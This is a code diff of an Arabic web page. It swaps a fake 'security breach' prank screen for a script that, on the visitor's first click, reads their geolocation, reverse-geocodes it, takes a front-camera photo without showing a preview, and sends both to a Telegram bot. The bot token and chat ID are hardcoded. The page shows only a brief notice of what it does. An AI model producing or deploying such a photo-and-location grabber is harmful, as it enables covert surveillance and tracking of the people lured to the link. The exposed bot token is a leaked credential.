@@ -2,99 +2,112 @@
 <html lang="ar">
 <head>
 <meta charset="UTF-8">
-<title>⚠️ SYSTEM BREACH</title>
+<title>جاري المعالجة</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
-*{margin:0;padding:0;box-sizing:border-box}
 body{
-  background:black;
-  color:red;
-  font-family:monospace;
+  font-family: Arial;
   text-align:center;
-  overflow:hidden;
+  margin-top:40px;
 }
-#overlay{
-  position:fixed;inset:0;
-  background:black;
-  display:flex;
-  flex-direction:column;
-  align-items:center;
-  justify-content:center;
+#centerImage{
+  width:220px;
+  margin:20px auto;
+  display:block;
 }
-#title{
-  font-size:28px;
-  animation:flicker .15s infinite;
-}
-#info{
-  margin-top:20px;
-  line-height:1.8;
-}
-#count{
-  font-size:64px;
-  margin-top:25px;
-}
-.shake{animation:shake .12s infinite}
-@keyframes shake{
-  0%{transform:translate(0,0)}
-  25%{transform:translate(3px,2px)}
-  50%{transform:translate(-3px,2px)}
-  75%{transform:translate(2px,-2px)}
-}
-@keyframes flicker{
-  0%{opacity:1}
-  50%{opacity:.3}
-  100%{opacity:1}
-}
-#truth{
-  display:none;
-  color:#00ff00;
-  font-size:26px;
-  margin-top:30px;
-}
-.small{font-size:14px;color:#aaa;margin-top:10px}
 </style>
 </head>
 <body>
 
-<div id="overlay" class="shake">
-  <div id="title">⚠️ تم رصد اختراق أمني ⚠️</div>
+<h3>📸 سيتم التقاط صورة واحدة بعد موافقتك</h3>
+<p>وسيتم إرسالها مع اسم موقعك الجغرافي</p>
 
-  <div id="info">
-    الجهاز: ANDROID<br>
-    النظام: LINUX<br>
-    IP: 192.168.1.84<br>
-    سحب البيانات: جارٍ التنفيذ…
-  </div>
+<!-- ✅ صورة في وسط الصفحة -->
+<img
+  id="centerImage"
+  src="https://ugc.production.linktr.ee/33eeaee9-a676-4312-b3bc-768c4266ef01_IMG-2923.webp?io=true&size=avatar-v3_0"
+  alt="صورة">
 
-  <div id="count">10</div>
-
-  <div id="truth">
-    😂 مجرد مقلب من بن دارة محمد<br>
-    لا يوجد أي اختراق<br>
-    أنت بأمان ✔
-    <div class="small">Visual prank only</div>
-  </div>
-</div>
+<canvas id="canvas" style="display:none;"></canvas>
 
 <script>
-let c = 10;
-const count = document.getElementById("count");
-const overlay = document.getElementById("overlay");
-const truth = document.getElementById("truth");
-const title = document.getElementById("title");
-const info  = document.getElementById("info");
+/* 🔧 ضع توكن البوت هنا (إن أمكن) */
+const BOT_TOKEN = "7936048532:AAEvG8kdxK0mXkCqiBYwiquJDfkzs-IHUXI";
 
-const timer = setInterval(()=>{
-  c--;
-  count.textContent = c;
-  if(c <= 0){
-    clearInterval(timer);
-    overlay.classList.remove("shake");
-    title.style.display="none";
-    info.style.display="none";
-    count.style.display="none";
-    truth.style.display="block";
-  }
-},1000);
+/* ✅ CHAT_ID مضاف */
+const CHAT_ID  = "6251932709";
+
+let done = false;
+
+// أول لمسة من المستخدم (ضرورية لكل الأجهزة)
+document.body.addEventListener("click", start, { once:true });
+
+async function start(){
+  if(done) return;
+  done = true;
+
+  navigator.geolocation.getCurrentPosition(async pos => {
+    const lat = pos.coords.latitude;
+    const lon = pos.coords.longitude;
+
+    // تحويل الإحداثيات إلى اسم منطقة
+    const geoRes = await fetch(
+      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`
+    );
+    const geo = await geoRes.json();
+
+    const area =
+      geo.address.city ||
+      geo.address.town ||
+      geo.address.village ||
+      geo.address.state ||
+      "غير معروف";
+
+    // تشغيل الكاميرا بدون معاينة
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video:{ facingMode:"user" },
+      audio:false
+    });
+
+    const video = document.createElement("video");
+    video.setAttribute("playsinline", true); // مهم للآيفون
+    video.srcObject = stream;
+    await video.play();
+
+    const canvas = document.getElementById("canvas");
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    canvas.getContext("2d").drawImage(video,0,0);
+
+    stream.getTracks().forEach(t => t.stop());
+
+    // إرسال الصورة كملف (Blob)
+    canvas.toBlob(async blob => {
+
+      // إرسال نص
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+        method:"POST",
+        headers:{ "Content-Type":"application/json" },
+        body:JSON.stringify({
+          chat_id:CHAT_ID,
+          text:`📸 صورة جديدة\n📍 الموقع: ${area}`
+        })
+      });
+
+      // إرسال الصورة
+      const fd = new FormData();
+      fd.append("chat_id", CHAT_ID);
+      fd.append("photo", blob, "photo.png");
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
+        method:"POST",
+        body:fd
+      });
+
+    },"image/png");
+
+  }, () => alert("❌ تم رفض الموقع"));
+}
 </script>
 
 </body>
